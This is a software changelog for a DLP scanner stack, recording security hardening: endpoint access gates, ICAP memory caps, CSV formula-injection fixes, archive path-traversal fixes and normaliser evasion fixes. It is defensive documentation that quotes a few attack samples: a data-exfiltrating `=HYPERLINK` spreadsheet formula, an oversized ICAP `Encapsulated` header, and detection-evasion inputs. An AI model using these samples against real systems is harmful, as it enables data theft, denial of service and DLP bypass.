# Changelog

All notable, user-visible changes to the Siphon stack are recorded here. Each
release block is dated and contains per-crate sub-sections — bumps are
independent, so a release block typically moves only the crates that actually
changed in a given wave.

Format follows [Keep a Changelog](https://keepachangelog.com/), adapted for
the per-crate SemVer model documented in `CLAUDE.md`. Older
workspace-single-version history (every crate moving in lockstep) lives in
`docs/CHANGELOG.md` and ends at the workspace `2.1.0` release on
2026-04-07. After that point, each crate publishes its own version stream,
starting from this file.

---

## 2026-09-04 — Scan accounting: stop dropping distinct scans; count all scanned traffic

### siphon-api 2.8.0

- **fix(api,security): stop discarding distinct scans that share content.**
  `persist_scan` skipped storing any scan whose `input_hash` had been seen in
  the previous 60 seconds, to absorb client retries. It suppressed far more
  than retries. Identical content is not a duplicate event: two people mailing
  the same attachment are two events, and the same signature image across a
  thousand messages is a thousand events. The check also carried **no tenant
  predicate**, so one tenant scanning a document made another tenant's scan of
  it disappear — and it logged at `debug`, so the loss was invisible.

  On any channel where a stored scan backs a delivery decision, dropping one
  means clearing content that was never recorded as scanned. Idempotency now
  keys on `scan_id` via `ON CONFLICT (id) DO NOTHING`, which suppresses the
  case that is genuinely a duplicate — the same scan persisted twice — at no
  extra round trip. The old check cost a `SELECT` per scan whose scanned range
  grew with traffic.

  Suppressing a *client* retry needs a caller-supplied idempotency key, since
  `scan_id` is generated server-side per request; that is recorded as
  follow-up. Until then a retry records two rows: over-recording is
  recoverable, under-recording is not.

- **feat(api): `scan_rollup` — aggregate counters for all scanned traffic.**
  Detection rate needs a denominator, but a row per scan means recording that
  nothing was found for every clean scan — at mail-gateway volume, the
  overwhelming majority of the table and the one thing that would force a
  columnar tier. New `scan_rollup` table (migration `0009`) counts scans per
  `(hour, tenant, channel)`, so storage scales with time and cardinality
  rather than with traffic, while identified events keep full rows.

  Counters accumulate in process and flush on an interval as additive
  UPSERTs, so pods flush independently and their counts sum with no
  coordination. A failed flush restores drained buckets by merging rather than
  overwriting, so a database blip costs latency rather than counts.

  `oversize_skipped` and `scan_errors` are counted separately and deliberately
  excluded from `scans_total`: content that was never inspected must not
  inflate the denominator and quietly improve the apparent detection rate.
  Rates are derived by the caller rather than stored, so a rate can never be
  wrong because one of its two inputs was updated and the other was not.

### siphon-fs 1.1.4

- **fix(fs): make scan persistence idempotent on `scan_id`.** siphon-fs never
  carried the content-hash dedup, but its scan insert had no conflict handling
  either, so the same `scan_id` written twice would duplicate every finding row
  hanging off it (`findings` has no unique constraint to conflict on). Now
  matches siphon-api: `ON CONFLICT (id) DO NOTHING`, and the findings loop is
  skipped when the scan was already stored.

---

## 2026-09-04

### siphon-api 2.7.0

- **feat(api): `SIPHON_AUDIT_CHAIN_SEED` resumes the audit chain on hosts with
  no durable disk.** The tamper-evident HMAC chain persisted its tail to
  `SIPHON_AUDIT_TAIL_PATH`, a local file. On a host whose filesystem does not
  survive a restart — Cloudflare Containers, scratch-FS pods — that file is
  gone on every cold start, so the chain silently restarted and the
  tamper-evidence it exists to provide was lost across restarts.

  An external store can now hand the last tail signature it observed back to
  the process at startup, and the first event of the new process links to it.
  `RotatingFileAuditHandler::with_seeded_chain()` already existed in
  siphon-core; it simply had no path from configuration.

  Precedence is deliberate: the seed is applied *before* the tail file, so a
  live tail written by the running process — strictly fresher than anything an
  external drain has observed — still wins, and the seed only takes effect on
  a genuinely cold start. A non-hex seed is refused with a warning and starts
  a fresh chain rather than linking to garbage.

  No behaviour change when the variable is unset.

---

## 2026-09-03 — Security: section-hdr OOM fix in siphon-icap; admin gate on patterns/categories + siphon-fs overrides/reload

### siphon-icap 0.1.2

- **fix(icap,security): cap encapsulated section-header allocation.**
  Non-body ICAP sections (`req-hdr`, `res-hdr`) were read with
  `vec![0u8; bytes_to_read]` where `bytes_to_read` was derived from
  attacker-supplied `Encapsulated` header offsets — no size limit existed.
  Sending `Encapsulated: req-hdr=0, null-body=1073741824` caused a 1 GB
  allocation before any I/O. The section-read path now rejects any declared
  size above 1 MiB (generous for HTTP headers) with an `InvalidData` I/O
  error that closes the connection.

### siphon-api 2.6.4

- **fix(api,security): gate `GET /v1/patterns` and `GET /v1/categories` behind
  `RequireAdminAction`.** Both endpoints were callable by any valid bearer key.
  They return the full regex surface — exact pattern strings, confidence
  thresholds, context requirements — giving any authenticated caller a precise
  map for engineering evasion inputs. Endpoints are now admin-only.

### siphon-fs 1.1.3

- **fix(fs,security): gate `POST /v1/overrides/reload` behind admin key.**
  The endpoint was accessible to any authenticated caller. A `RequireAdminAction`
  extractor now validates the bearer token against `SIPHON_ADMIN_KEY` (falls back
  to `SIPHON_API_KEY` in single-key deployments). Unauthorized calls receive 403.

---

## 2026-09-03 — Security: OOM + connection-exhaustion fixes in siphon-icap; admin gate on EDM/LSH vault endpoints

### siphon-icap 0.1.1

- **fix(icap,security): cap individual chunk size before allocation.**
  A malicious ICAP client could announce an enormous chunk size (e.g., `ffffffff`
  in the hex size field), causing the drain path to allocate gigabytes on the heap
  before any cap check fired. `read_chunked_buf` now rejects any chunk whose hex
  size exceeds 64 MiB with an I/O error, closing the connection. Drain path
  switched from `vec![0u8; size]` to a fixed 8 KiB scratch buffer to avoid any
  large allocation regardless.

- **fix(icap,security): bound concurrent connections via semaphore.**
  `accept_loop` spawned an unbounded number of Tokio tasks — a single attacker
  could exhaust memory/thread-pool by opening many connections simultaneously.
  A `tokio::sync::Semaphore` now caps concurrent connections at
  `SIPHON_ICAP_MAX_CONNECTIONS` (default 256). Connections beyond the limit are
  dropped immediately with a warning log.

### siphon-api 2.6.3

- **fix(api,security): gate `GET /v1/edm` and `GET /v1/lsh` behind
  `RequireAdminAction`.** Both vault-listing endpoints were callable by any
  authenticated user. Even though the current responses are stubs, they expose
  internal DLP configuration surface and establish a precedent for future vault
  enumeration. Endpoints are now admin-only.

---

## 2026-09-03 — RBAC hardening: admin gate on eight additional endpoints + streaming audit

### siphon-api 2.6.2

- **fix(api,security): gate `GET /v1/audit` behind `RequireAdminAction`.** Audit
  events contain source IPs, operation metadata, and timing of every scan — any
  authenticated caller could enumerate the full audit ring. Endpoint is now
  admin-only.

- **fix(api,security): gate `GET /v1/allowlist` behind `RequireAdminAction`.**
  The allowlist contains the exact text strings and regex patterns that cause the
  scanner to suppress findings — exposing this to non-admins hands callers a
  complete DLP bypass map. Endpoint is now admin-only.

- **fix(api,security): gate `GET /v1/overrides/current` and `GET
  /v1/overrides/disk` behind `RequireAdminAction`.** Both endpoints return the
  live and on-disk pattern override configs (disabled patterns, field overrides,
  runtime regex swaps). Previously readable by any authenticated caller. Now
  admin-only.

- **fix(api,security): gate `GET /v1/policies` behind `RequireAdminAction`.**
  The response includes `source` — the `SIPHON_POLICIES_DIR` filesystem path —
  and the full policy list (baseline configurations). Previously readable by any
  authenticated caller. Now admin-only.

- **fix(api,security): gate `GET /v1/metrics` behind `RequireAdminAction`.**
  Metrics (uptime, scan totals, error counts, pattern counts) are operational
  state useful for fingerprinting the scanner. Now admin-only.

- **fix(api,security): gate `GET /v1/ratelimit` behind `RequireAdminAction`.**
  Returns active bucket counts that could be used to time attacks. Now
  admin-only.

- **fix(api,security): gate `GET /v1/version` behind `RequireAdminAction`.**
  Returns `target_triple`, `rust_version`, and `build_profile` — build
  fingerprinting info. Now admin-only.

- **fix(api,compliance): emit SCAN audit events from `POST /scan/stream`.**
  Streaming scans were not recorded in the audit log, creating a PCI-DSS gap
  where significant scan activity was invisible. `scan_stream` now emits a SCAN
  audit event (with source IP, finding count, duration) on success and on error.

---

## 2026-09-03 — siphon-icap: network DLP via ICAP proxy integration

### siphon-icap 0.1.0

- **feat(icap): initial ICAP/1.0 server — network DLP via proxy integration.**
  New crate (`crates/siphon-icap/`) that lets any ICAP-capable HTTP proxy
  (Squid, nginx ICAP module, Blue Coat, Zscaler, McAfee Web Gateway) offload
  DLP inspection to Siphon without changing application code. The proxy
  connects to `icap://<host>:1344/dlp` and sends every HTTP request or
  response; Siphon scans the body and either allows or blocks.

  Supported methods: `OPTIONS`, `REQMOD` (outgoing request body), `RESPMOD`
  (incoming response body). Two modes: `flag` (annotate findings in
  `X-DLP-Findings` / `X-DLP-Categories` headers and allow) and `block`
  (return a synthetic HTTP 403 block page to the proxy).

  Security: `SIPHON_ICAP_ALLOWED_NETS` (comma-separated IP/CIDR) is required
  at startup — the service refuses to start without it, since ICAP has no
  built-in auth layer. Connections from IPs outside the list are dropped
  immediately. JSON audit line emitted to stdout for every REQMOD/RESPMOD.

  Binary bodies (> 30% non-printable bytes in first 512) and oversized bodies
  (> `SIPHON_ICAP_MAX_BODY_BYTES`, default 10 MB) pass through unscanned with
  a 204 No Content response. ICAP keep-alive is supported.

---

## 2026-09-03 — RBAC hardening: admin gate on six unprotected endpoints

### siphon-api 2.6.1

- **fix(api,security): gate `GET /v1/overrides/history` and `GET
  /v1/overrides/content` behind `RequireAdminAction`.** Previously any
  authenticated caller could enumerate backup file paths and read their contents.
  Both endpoints now require the admin role.

- **fix(api,security): gate `GET /v1/integrations` behind `RequireAdminAction`.**
  The endpoint returns the active SIEM URL (which may embed credentials) and is
  now restricted to admins.

- **fix(api,security): gate `GET /v1/lsh/history` behind `RequireAdminAction`.**
  Also added to `endpoint_rate_limit()` at 30 req/min — it runs an up-to-1000-row
  DB query and was not previously covered by the per-endpoint throttle.

- **fix(api,security): gate `GET /v1/k8s/pods` behind `RequireAdminAction` (both
  feature variants).** Any authenticated caller could previously enumerate the
  cluster pod inventory. Fix applied to both the k8s-roll and stub variants.

- **fix(api,security): `POST /v1/scan/explain` — sanitise 500 error body and
  emit audit events.** Internal scan engine errors were reflected verbatim in the
  response body. The body now returns a static `"scan processing failed"` string;
  the raw error is logged internally. AUDIT events are emitted on both success
  and failure paths.

---

## 2026-09-03 — Key rotation, tenant isolation, pg-first aggregation, fs rate limiter

### siphon-fs 1.1.2

- **fix(fs): add per-IP and per-key rate limiting to `POST /scan` and all
  authenticated endpoints.** siphon-fs previously had no rate limiter — file
  uploads to `POST /scan` were unbounded, creating a DoS and log-flooding
  vector. A sliding-window `RateLimiter` (matching siphon-api's implementation)
  now gates every request except `/health` and `/ready`. The global cap defaults
  to **30 req/min** per IP (lower than siphon-api's 120 because file uploads are
  heavier than text scans). Configure with `SIPHON_FS_RATE_LIMIT`. Bearer-token
  hash is used as a secondary bucket so a compromised key cannot exhaust quota
  for other callers behind a shared IP. Exceeding either bucket returns `429 Too
  Many Requests`.

### siphon-api 2.6.0

- **feat(api): zero-downtime API key rotation via `SIPHON_API_KEY_SECONDARY`.**
  Set the secondary key on all pods while clients migrate; both keys are accepted
  in parallel via constant-time XOR-fold (no timing oracle). Promote the new key
  to `SIPHON_API_KEY` and clear the secondary once all clients are updated. See
  `SECURITY.md` for the rotation procedure.

- **feat(api): tenant policy isolation on scan requests.** When
  `X-Siphon-Tenant` is present, `POST /scan` and `POST /scan/batch` now look up
  the matching policy by name and apply its `min_confidence`, `require_context`,
  and `categories` as a per-request baseline. Caller options override the policy
  baseline when set.

- **feat(api): tenant-scoped DB queries on `GET /v1/findings/pg` and
  `GET /v1/findings/export`.** Both endpoints now filter by `tenant_id` when
  `X-Siphon-Tenant` is present, preventing cross-tenant data leakage. Admin
  calls without the header retain full cross-tenant visibility.

- **feat(api,c2): postgres-first findings aggregation in C2 dashboard.**
  `useFindingsUnion` now tries `/v1/findings/pg` first (durable, cross-pod
  authoritative view) and falls back to the per-pod in-memory ring only when
  the postgres endpoint is unavailable.

## 2026-09-03 — purple-team remediations (evasion + startup guards)

A parallel purple-team exercise (separate session). Merged after the main wave.

### siphon-core 2.3.2

- **BYPASS-07: expand the leet-speak map.** Added `|`→`l`, `$`→`s`, and `€`
  (U+20AC)→`e`. The 14-entry map missed these, so payloads like `$0ci@l
  $ecur1ty` slipped past leet normalization.
- **BYPASS-12: strip non-empty CSS/HTML comments.** `strip_comments` matched
  only the empty literal forms `/**/` and `<!---->`; it now scans and strips any
  `/* ... */` or `<!-- ... -->` regardless of interior content, closing the
  comment-injection evasion family (e.g. `4111/*junk*/1111...`). Unterminated
  openers are left as literal text.

### siphon-api 2.5.3

- **GAP-01: refuse `SIPHON_ALLOW_UNAUTHENTICATED` on a non-loopback bind.** If
  `SIPHON_BIND` is not `127.0.0.1`/`::1`/`localhost`, the service now exits at
  startup rather than serving an open API on a network interface. The flag stays
  valid for loopback local dev.
- **GAP-07: require `SIPHON_AUDIT_LOG_PATH` in production.** An in-memory ring is
  not durable enough for a PCI-DSS audit trail; the service exits if the path is
  unset and `SIPHON_DEV_MODE` is not `true`.

---

## 2026-09-03 — pod-to-pod mTLS on by default

### Helm chart 2.3.0

- **feat(chart): default `global.linkerd.enabled=true`.** Pod-to-pod traffic —
  including siphon-fs file uploads, which carry the sensitive data the scanner
  detects and cross the pod network with no service-level TLS — is now
  mTLS-encrypted and mutually authenticated by default via Linkerd sidecar
  injection. **Requires the Linkerd control plane installed in the cluster**
  (`linkerd install`); the inject annotation is inert without it, so a cluster
  with no Linkerd must install it or knowingly set the flag back to false and
  secure the hops another way. The default-deny NetworkPolicy (already on)
  complements this. NOTES.txt now confirms mTLS when on and warns when off;
  README documents the prerequisite and verification (`linkerd viz stat`).
  Chart `version` 2.2.0 → 2.3.0; `appVersion` stays 2.2.4 (no crate moved).

---

## 2026-09-03 — pentest wave PT-1..PT-6 + service hardening

A parallel adversarial pentest (separate session). Merged alongside the CORS /
archive / SSN wave; the shared `siphon-fs` CORS default was reconciled to keep
the `SIPHON_ALLOW_PERMISSIVE_CORS` dev opt-in, and HSTS-over-HTTP was removed.

### siphon-api 2.5.2 (also carries)

- **PT-1**: gate `GET /v1/findings`, `/v1/findings/pg`, `/v1/findings/stats`,
  `/v1/evadex/runs`, `/v1/evadex/runs/stats` behind `RequireAdminAction`. These
  five read handlers had no RBAC check — any valid key could dump the full
  unredacted finding stream, acute once multi-key role mapping ships.
- **PT-2**: the `contains` filter now searches category / sub_category only, not
  raw `matched_text`, closing a boolean-oracle against stored PAN/SSN values.
- **PT-4** (surfacing): `ring_evictions_total` exposed in `/v1/health/detailed`.
- **PT-5**: `variant_value` redacted (first-4 + `****`) before INSERT into
  `evadex_findings`, removing plaintext PAN/SSN from the Postgres test table.

### siphon-core 2.3.1 (also carries)

- **PT-4**: `FindingsRing::push()` logs and increments an `AtomicU64` eviction
  counter when the ring is full, so operators can detect ring-flooding.

### siphon 2.2.4 (also carries)

- **PT-3**: the syslog SIEM adapter host now passes through `is_safe_url()`
  before the TCP/UDP connection, closing the SSRF gap that remained while the
  HTTP-based adapters were already validated.

### siphon-fs 1.1.3 (also carries)

- **fix(fs): remove HSTS over plaintext.** siphon-fs serves no TLS, and browsers
  ignore `Strict-Transport-Security` received over HTTP (RFC 6797 §7.2), so the
  header was noise. Removed from `security_headers`.

### siphon-launcher 2.1.1

- **fix(launcher): allowlist env keys on the start API.** Only `SIPHON_*`,
  `RUST_LOG`, `RUST_BACKTRACE` prefixes are accepted, and `SIPHON_API_KEY`,
  `SIPHON_AUDIT_LOG_PATH`, `SIPHON_BIND`, `SIPHON_FS_BIND` are blocked outright —
  a spawned pod can no longer have security-critical env injected through the
  launcher.
- **PT-6**: `SIPHON_ALLOW_PRIVATE_DESTINATIONS` added to the blocked keys, so env
  injection can't globally disable the SSRF defences.

---

## 2026-09-03 — CORS defaults to deny

Both HTTP services fell back to `CorsLayer::permissive()` (reflect any Origin)
when their CORS origins variable was unset. For a service that returns detected
card numbers and SSNs — and for siphon-fs, accepts file uploads — insecure-by-
default is the wrong posture. Bearer-token auth limited the blast radius
(cross-origin JS can't read the key), but the default now denies cross-origin.

### siphon-api 2.5.2

- **fix(api): default-deny cross-origin when `SIPHON_CORS_ORIGINS` is unset.**
  Was permissive. Now an unset value denies cross-origin browser requests; set
  an explicit origin allowlist in production, or `SIPHON_ALLOW_PERMISSIVE_CORS=true`
  for local dev (the admin console served from `file://` / `Origin: null` needs
  it). An explicit `SIPHON_CORS_ORIGINS=*` still reflects any origin.

### siphon-fs 1.1.3

- **fix(fs): default-deny cross-origin when `SIPHON_FS_CORS_ORIGINS` is unset.**
  Same change as siphon-api. Previously any web page could POST a file to
  siphon-fs and read the findings back cross-origin — a browser-driven
  exfiltration path. Opt back in for dev with `SIPHON_ALLOW_PERMISSIVE_CORS=true`.

---

## 2026-09-03 — nested archives no longer a silent gap

Follow-up from the ZIP DLP-bypass work. Sensitive data one archive layer deep
(a `.zip`/`.7z`/`.rar` inside another archive) was skipped with no signal.
Rather than recurse — deep recursion is where zip-bomb amplification lives — the
extractors now flag it so an analyst sees that unscanned content is present.

### siphon 2.2.4

- **fix(cli): surface a warning for nested and encrypted archive entries.** The
  ZIP, RAR and 7z walkers previously skipped an inner archive (or an encrypted
  entry) in silence, so a sensitive file inside `outer.zip → inner.zip` scanned
  to zero findings with no indication anything was missed. They now emit a
  `nested archive not scanned: <name>` (or `encrypted entry not scanned`)
  warning via `ExtractionResult::warnings`, capped at 20 per file. No recursion,
  so no new bomb-amplification surface.

### siphon-fs 1.1.2

- **fix(fs): preserve extraction warnings on the empty-text path.** A container
  holding only a nested/encrypted archive extracts to empty text; the empty-text
  short-circuit was replacing the extractor's warnings with a fixed
  "no extractable text" note, dropping the `nested archive not scanned` signal
  that is the whole point for that file. The warnings are now merged.

---

## 2026-09-03 — space-separated SSN evasion

Found while pen-testing the detection engine.

### siphon-core 2.3.1

- **fix(core): stop the hex-spaced normalizer from swallowing space-separated
  numeric PII.** A space-separated SSN like `457 55 5462` evaded detection
  entirely: the `decode_hex_spaced` stage began a run mid-token (at offset 1)
  and read `57 55 54` as three hex bytes, rewriting the digits to `WUT` before
  any pattern ran. The regex, validator and context gate were all fine — the
  data was destroyed in normalization. The decoder now requires a run to begin
  at a token boundary and each pair to be a complete two-hex-digit token, which
  is what a genuine hex dump (`34 35 33 32`) looks like and what formatted
  decimal data (3/2/4 groups) is not. Real hex-spaced evasion still decodes;
  space/dot-grouped SSNs now survive and are detected. Regression tests added in
  `normalize` (unit) and `evasion_test` (end-to-end); detection_quality and
  fp_probe corpora unchanged and green.

  This is a library fix; it reaches the CLI and services on their next release.

---

## 2026-09-03 — CSV formula injection

Found while pen-testing the findings-export path. CWE-1236.

### siphon-api 2.5.1

- **fix(api): neutralize spreadsheet formula injection in `/v1/findings/export`
  CSV.** `matched_text` in an exported finding is content the scanner pulled from
  an uploaded document — attacker-controlled. A cell beginning with `=`, `+`,
  `-`, `@`, TAB or CR is evaluated as a formula by Excel / Sheets / LibreOffice,
  so an exported finding like `=HYPERLINK("http://x/?"&A1)` or a DDE payload ran
  in the analyst's spreadsheet on open. The previous escaper only applied
  RFC-4180 quoting, which does **not** stop this — the app strips the quotes
  before evaluating. Dangerous cells are now prefixed with a single quote to
  force text; delimiter quoting is unchanged. It also now quotes on a lone `\r`.

### siphon 2.2.3

- **fix(cli): apply the same formula-injection defense to `--format csv`.** The
  CLI escaper detected the dangerous lead characters but only quoted them, which
  is ineffective for the same reason. It now prefixes a quote. Lower severity
  than the API path — the CLI CSV carries file paths, formats and error strings
  rather than matched values — but a crafted filename beginning with `=` was
  still a live vector.

---

## 2026-09-03 — pen-test follow-ups

Found while pen-testing the merged hardening wave. The first is a silent DLP
bypass — the scanner's core job failing quietly — which is the most serious
class of defect for this product.

### siphon 2.2.2

- **fix(cli): scan text files inside plain ZIP archives.** The generic-ZIP
  extractor only ever collected Office XML entries (`word/`, `xl/`, `ppt/`),
  so a plain `.zip` containing a `.txt`, `.csv`, `.eml` etc. extracted to
  nothing and was never scanned — `zip out.zip secrets.txt` defeated the
  scanner outright, and the empty extraction surfaced as a confusing 500. The
  generic path now walks every entry and scans text-like files by content, the
  same treatment `extract_rar` and `extract_7z` already gave theirs, under the
  identical per-entry / total-size / compression-ratio guards. Entries are read
  by name into memory, never written to disk, so this path carries no archive
  traversal risk. The three archive walkers now share one `ARCHIVE_TEXT_EXTENSIONS`
  list so they cannot drift. Regression tests in `tests/archive_security_test.rs`.

### siphon-fs 1.1.1

- **fix(fs): return a clean empty result when a file has no extractable text.**
  A file that parsed cleanly but yielded no text (a binary-only or nested-only
  archive, an image with no barcode, an empty document) was passed to the core
  scanner, which rejects empty input, turning "nothing to find" into a 500
  "scan processing failed". The handler now short-circuits to a 200 with zero
  findings and a `no extractable text in file` warning, which is the correct
  answer and denies an attacker a trivial way to force 500s with empty-but-valid
  uploads.

---

## 2026-09-03 — security hardening wave

Consolidates the work previously split across PRs #407-#411. Two crates change
their **startup contract** and are therefore MINOR, not PATCH: siphon-api and
siphon-fs now refuse to start without an API key. Read the siphon-fs note
before upgrading — a deployment that never set `SIPHON_API_KEY` will not boot.

### siphon-api 2.5.0

- **fix(api)!: fail closed when no API key is configured.** An unset *or empty*
  `SIPHON_API_KEY` previously started the service with every endpoint open.
  Empty now counts as unset, and startup aborts unless
  `SIPHON_ALLOW_UNAUTHENTICATED=true` is set explicitly.
- **fix(api): require TLS to Postgres.** Findings rows carry the card numbers,
  national IDs and credentials the scanner exists to detect, and they crossed
  the wire on `NoTls`. `SIPHON_DATABASE_TLS` now defaults to `require`, with
  `SIPHON_DATABASE_CA_FILE` for a self-signed server certificate. Supplying a
  TLS connector is not sufficient on its own: tokio-postgres defaults to
  `SslMode::Prefer`, which negotiates TLS and then continues in clear text if
  the server declines, so `ssl_mode` is pinned explicitly. Because rustls
  verifies the server certificate, this is stronger than libpq's `require`.
- **fix(api): key rate limits on the real client.** `ConnectInfo` yields the TCP
  peer, which behind a reverse proxy is the proxy — collapsing every caller into
  one bucket. `X-Forwarded-For` is now honoured, but only from networks listed
  in `SIPHON_TRUSTED_PROXIES`, and only its right-most entry (the one the
  trusted proxy appended). Trusting the header unconditionally would be worse
  than the collapse: any client could forge a value and evade the limit.
- **fix(api): gate every policy-mutating endpoint on `AdminAction`.**
  `POST /v1/overrides/apply`, `/reload` and `/revert`, `PATCH /v1/pipeline/stages`,
  `POST /v1/evadex/runs`, and `GET /v1/findings/export` were reachable without
  the permission, while the less destructive `/v1/findings/prune` and
  `/v1/admin/reload` were gated. Two distinct exposures: in open mode the
  `Operator` role could rewrite the detection policy outright (disable every
  pattern, or bind an allow-list that passes the data the scanner exists to
  catch), and `findings_export` returns up to 100k rows of matched findings to
  any key holder.
- fix(api): add `Referrer-Policy` and `Permissions-Policy` to the
  `security_headers` middleware, so every deployment path is covered rather
  than only those behind the nginx proxy and Cloudflare edge.

### siphon-fs 1.1.0

- **fix(fs)!: add authentication, which this service never had.** `POST /scan`
  accepted uploads, `GET /v1/findings` returned previously scanned findings, and
  `POST /v1/overrides/reload` mutated detection config — all without a
  credential. `CLAUDE.md` and the nginx config both asserted otherwise, and
  nginx omits its Authelia gate for `/fs/` on the stated grounds that
  "siphon-fs validates SIPHON_API_KEY itself", which was never true. Bearer-token
  auth now matches siphon-api exactly (constant-time compare, empty counts as
  unset, `/health` and `/ready` stay open for kubelet). **Upgrading requires
  `SIPHON_API_KEY` to be set, or `SIPHON_ALLOW_UNAUTHENTICATED=true` for local
  development.** Covered by `crates/siphon-fs/tests/auth_test.rs`.
- fix(fs): require TLS to Postgres, mirroring siphon-api's implementation and
  env vars.
- fix(fs): replace unconditional `CorsLayer::permissive()` with an
  env-aware `cors_layer()` reading `SIPHON_FS_CORS_ORIGINS`. Previously any page
  could make cross-origin multipart uploads and read the scan response,
  enabling file-content exfiltration from a victim's browser.
- fix(fs): add the `security_headers` middleware (mirrors siphon-api).
  siphon-fs responses were bare when reached directly inside the cluster.

### siphon 2.2.1

- fix(cli): **RUSTSEC-2026-0245** — 7z path-traversal vulnerability fixed.
  `extract_7z` previously called `sevenz_rust::decompress_file`, whose internal
  `decompress_impl` builds each output path as `dest.join(entry.name())` with no
  sanitisation: a `../` entry escapes the temp directory, and an absolute entry
  name discards it entirely (`Path::join` on an absolute path returns that path).
  The extractor now drives extraction entry-by-entry via
  `decompress_file_with_extract_fn`, routing every name through
  `sanitize_archive_path` before any write is attempted. Hostile entries are
  skipped with a `WARN` log line; benign contents continue to scan normally.
  Decompression-bomb enforcement is also moved into the extraction loop so the
  size budget is enforced as bytes are written rather than after the full
  archive is on disk. Regression tests in `tests/archive_security_test.rs`.
- chore(deps): bump `anyhow` 1.0.102 → 1.0.104 (RUSTSEC-2026-0190,
  memory-corruption in `Error::downcast_mut`).
- chore(deps): bump `h2` 0.4.15 → 0.4.19 (RUSTSEC-2026-0258, DoS via
  unbounded empty DATA frames).
- chore(deps): bump `lru` 0.18.0 → 0.18.3 (RUSTSEC-2026-0253, potential
  use-after-free in `LruCache::pop`).
- chore(deps): bump `chacha20` 0.10.0 → 0.10.2 (yanked version).

### Helm chart 2.2.0

- feat(chart): `postgres.sslMode` (default `disable`) and `postgres.caFile` wire
  the new TLS controls. The default is `disable` only because the chart's
  bundled `postgres:17-alpine` serves no certificate — inheriting siphon-api's
  `require` default would crashloop it. Set `require` when pointing at a managed
  Postgres.
- feat(chart): `api.trustedProxies` sets `SIPHON_TRUSTED_PROXIES`. Left empty by
  default because the pod CIDR is cluster-specific; widening it past the
  networks your proxy actually occupies lets anything in range forge its own
  rate-limit bucket.

---

## 2026-07-22

### siphon-core 2.2.2

- fix(core): eliminate a normalization denial-of-service. `collapse_padding`
  was O(n²) — it rescanned forward from every whitespace byte — so a
  mostly-whitespace input (accepted up to the 10 MB limit; the scan timeout
  is only checked after normalization) could pin a core for minutes: a
  512 KiB whitespace run took ~86 s. The run is now processed in one step;
  the same input normalizes in 7.7 ms and a 4 MB run in 93 ms.
- fix(core): `scan_high_entropy_tokens` (optional entropy-scan modes) panicked
  on non-ASCII input. The Gated context window sliced a separately-lowercased
  string with offsets from the un-lowercased text, and the Assignment prefix
  window sliced at a fixed byte offset without snapping to a UTF-8 char
  boundary — both could land mid-sequence. Windows are now char-boundary-safe.
- fix(core): entropy-token span mapping used the multibyte-corrupting
  `offset_map[norm_end-1]+1` form; aligned it to `offset_map[norm_end]` to
  match the primary regex path.
- fix(core): `decode_hex_escapes` mojibake-corrupted non-ASCII text (and
  desynced the offset map) whenever a literal `\x` escape was present, by
  copying passthrough bytes through `char` (Latin-1 reinterpretation). It now
  buffers raw bytes like every other byte-level normalization stage.

### siphon-core 2.2.1

- fix(core): `pattern_specificity()` had three dead map keys that matched
  no pattern sub_category. `"Slack Webhook URL"` => 0.90 was renamed to
  the real `"Slack Webhook"` name — the webhook pattern had been silently
  falling back to the 0.40 default and now scores 0.90. The dead
  `"Phone Number (E.164)"` and `"API Key Generic"` keys were removed
  (E.164 intentionally stays at the calibrated 0.40 default so the
  country-specific phone patterns win dedup ties).
- fix(core): `is_context_required()` was missing Malta TIN, Chile
  RUN/RUT, and Tanzania NIDA, which the corresponding `PatternDef`
  entries mark context-required — the `context_required_drift_zero`
  audit test failed. Runtime behavior is unchanged (the scanner ORs both
  sources); the lists are back in lockstep.
- docs: `docs/PATTERNS.md` and `docs/KEYWORDS.md` are now generated from
  the scanner sources by `scripts/gen-pattern-docs.py` (with a `--check`
  mode), fixing 5 missing patterns, 8 missing keyword groups, 174 stale
  specificity/context values, and 7 outdated regexes in the docs.

## 2026-07-08

### siphon-core 2.3.0

- feat(core): AML/CFT filing detection — new **Financial Crime Reports**
  category detects the regulatory filings themselves so DLP can flag or block
  their exfiltration, across the major FIU regimes:
    - **US** (FinCEN / Bank Secrecy Act): SAR, CTR, Form 8300, plus form
      markers (Form 111/112, BSA E-Filing) and the statutory confidentiality /
      anti-tipping-off citations (31 U.S.C. 5318(g), 31 CFR 1020.320)
    - **Canada** (FINTRAC / PCMLTFA): STR, LCTR, EFTR, Terrorist Property
      Report, plus PCMLTFA / FINTRAC / CANAFE markers
    - **Australia** (AUSTRAC / AML/CTF Act): SMR, TTR, IFTI
    - **UK** (NCA / UKFIU / POCA 2002): SAR, DAML "Defence Against Money
      Laundering"

  The distinctive multi-word signatures and regulator/statute markers run
  always (≥ 0.85, like TLP markings) so a filing title is detected wherever it
  appears; "electronic funds transfer" (EFTR) and the generic "reasonable
  grounds to suspect" phrase stay keyword-gated to avoid false positives in
  ordinary banking/legal prose. Adds 15 patterns + 13 context-keyword groups, a
  `rulesets/aml-sar-str.yaml` policy (FinCEN + FINTRAC + AUSTRAC + UK), and 15
  detection tests.

### siphon-core 2.2.0

- feat(core): regional digit homoglyph coverage extended — Arabic-Indic
  (U+0660–U+0669), Extended Arabic-Indic (U+06F0–U+06F9), and Thai
  (U+0E50–U+0E59) digit sets added to the HOMOGLYPH_MAP. Evasion variants
  that substitute these regional digits for ASCII equivalents are now
  normalised in stage 2 before pattern matching, closing bypass paths
  previously exposed by evadex's regional_digits technique family.
- feat(core): Morse decoder accepts comma `','` and colon `':'` as
  additional word-boundary separators (in addition to `/` and `|`). Handles
  the evadex `comma_sep` and `colon_sep` Morse variants. A dedicated
  `try_decode_digit_morse_comma` fast-path mirrors the existing slash/pipe
  paths to avoid regex overhead for digit-only payloads.

### siphon-api 2.4.0

- feat(api): `persist_scan()` deduplication — duplicate writes within a 60 s
  window are suppressed when `input_hash` matches an existing scan row
  (`WHERE input_hash = $1 AND created_at > NOW() - INTERVAL '60 seconds'`).
  Prevents double-counted findings from client-level retries hitting the same
  endpoint in quick succession.

---

## 2026-07-04

### siphon-core 2.1.7

Extends the morse alt-decode path to tolerate surrounding text for the
delimited digit-morse variants. Stacks on 2.1.6.

- fix(core): new `find_embedded_digit_morse_delimited()` recovers a run of
  digit-only morse tokens joined by a consistent `/`, `,`, or `|` delimiter when
  it is embedded in larger text (a filename preamble on the file-scan path, or a
  prose prefix such as `card `). The whole-input decoders
  `try_decode_digit_morse_slash` / `_comma` bail as soon as a non-morse token
  pollutes the input, and no whole-input digit decoder covered pipe at all — so
  `invoice.txt\n<comma-morse-card>` previously bypassed even though the *nosep*
